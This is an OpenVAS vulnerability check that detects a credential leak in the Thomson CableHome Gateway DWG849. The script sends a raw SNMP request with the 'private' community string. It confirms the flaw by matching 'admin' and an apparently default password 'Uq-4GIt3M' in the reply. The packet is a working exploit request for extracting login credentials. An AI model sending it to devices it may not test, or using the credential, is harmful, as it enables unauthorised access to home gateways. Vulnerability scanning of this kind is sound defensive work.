###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_thomson_cablehome_gateway_info_disc_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
#
# Thomson CableHome Gateway(DWG849) Information Exposure
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805739");
  script_version("$Revision: 11424 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-09-22 15:38:14 +0530 (Tue, 22 Sep 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Thomson CableHome Gateway(DWG849) Information Exposure");

  script_tag(name:"summary", value:"This host has Thomson CableHome Gateway(DWG849)
  and is prone to information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted SNMP request and
  check whether it is able read the user name or not");

  script_tag(name:"insight", value:"The flaw is due to application offer
  security authentication through SNMPv1 and SNMPv2.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to gain access to potentially sensitive information.");

  script_tag(name:"affected", value:"Thomson CableHome Gateway - DWG849");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38242");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_snmp_sysdesc.nasl");
  script_require_udp_ports("Services/udp/snmp", 161);
  script_mandatory_keys("SNMP/sysdesc/available");

  exit(0);
}

include("snmp_func.inc");

snmp_port = get_snmp_port(default:161);
sysdesc = get_snmp_sysdesc(port:snmp_port);
if(!sysdesc) exit(0);

if( sysdesc =~ "Thomson CableHome Gateway" )
{

  soc = open_sock_udp(snmp_port);
  if(!soc) {
    exit(0);
  }

  req = raw_string(0x30, 0x81, 0x84, 0x02, 0x01, 0x01, 0x04, 0x07,
                   0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0xa0,
                   0x76, 0x02, 0x04, 0x78, 0x55, 0x6d, 0x35, 0x02,
                   0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x68, 0x30,
                   0x13, 0x06, 0x0f, 0x2b, 0x06, 0x01, 0x04, 0x01,
                   0xa3, 0x0b, 0x02, 0x04, 0x01, 0x01, 0x06, 0x01,
                   0x01, 0x00, 0x05, 0x00, 0x30, 0x13, 0x06, 0x0f,
                   0x2b, 0x06, 0x01, 0x04, 0x01, 0xa3, 0x0b, 0x02,
                   0x04, 0x01, 0x01, 0x06, 0x01, 0x02, 0x00, 0x05,
                   0x00, 0x30, 0x16, 0x06, 0x12, 0x2b, 0x06, 0x01,
                   0x04, 0x01, 0xa2, 0x3d, 0x02, 0x02, 0x02, 0x01,
                   0x05, 0x04, 0x01, 0x0e, 0x01, 0x03, 0x20, 0x05,
                   0x00, 0x30, 0x16, 0x06, 0x12, 0x2b, 0x06, 0x01,
                   0x04, 0x01, 0xa2, 0x3d, 0x02, 0x02, 0x02, 0x01,
                   0x05, 0x04, 0x02, 0x04, 0x01, 0x02, 0x20, 0x05,
                   0x00, 0x30, 0x0c, 0x06, 0x08, 0x2b, 0x06, 0x01,
                   0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00);

  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1024);
  close(soc);

  if(!buf) {
    exit(0);
  }

  if ("Thomson CableHome Gateway" >< buf && "admin" >< buf && "Uq-4GIt3M" >< buf)
  {
    security_message(port:snmp_port);
    exit(0);
  }
}
